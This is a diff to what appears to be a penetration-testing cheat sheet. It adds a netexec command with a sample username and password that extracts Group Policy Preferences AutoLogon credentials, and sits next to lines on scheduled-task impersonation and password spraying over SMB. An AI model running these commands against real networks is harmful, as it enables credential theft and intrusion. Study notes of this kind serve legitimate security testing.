@@ -59,6 +59,12 @@ If there are logged on users whe can try some impersonting scheduling of tasks
 	-M schtask_as -o USER=<loggedon_username> CMD=whoami
 
 
+Try to look for Group Policy Preferences (GPP) store plaintext or AES-encrypted credentials for AutoLogon in Active Directory environments:
+```shell
+netexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
+```
+
+
 ## Test users
 
 	netexec smb <target_ip> -u usernames.txt -p passwords.txt --continue-on-success
